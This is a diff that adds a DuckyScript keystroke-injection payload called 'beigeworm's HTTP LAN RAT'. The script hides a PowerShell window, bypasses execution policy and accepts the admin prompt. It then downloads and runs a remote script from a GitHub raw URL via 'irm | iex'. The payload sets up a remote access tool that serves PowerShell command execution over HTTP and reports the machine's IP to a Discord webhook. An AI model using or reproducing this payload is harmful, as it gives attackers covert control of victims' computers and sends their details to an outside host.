@@ -1,0 +1,19 @@
+REM Title: beigeworm's HTTP LAN RAT
+REM Author: @beigeworm
+REM Description: This script hosts a webpage on the machines ip address with powershell commands to execute.
+REM ( use ipconfig to find the local ip and type http://<LOCALIP>:5000/ in a browser )
+REM **MUST BE RUN AS ADMIN**
+REM Discord Webhook not required - It will post the machine's local IP to discord.
+
+REM some setup for dukie script
+DEFAULT_DELAY 100
+
+REM open powershell (remove "-W H" to show the window)
+DELAY 1000
+GUI r
+DELAY 750
+STRING powershell -w h -NoP -Ep Bypass -C $dc='WEBHOOK_HERE'; irm https://raw.githubusercontent.com/beigeworm/assets/main/Scripts/FolderHost-w-PS.ps1 | iex
+CTRL-SHIFT ENTER
+DELAY 3000
+ALT y
+
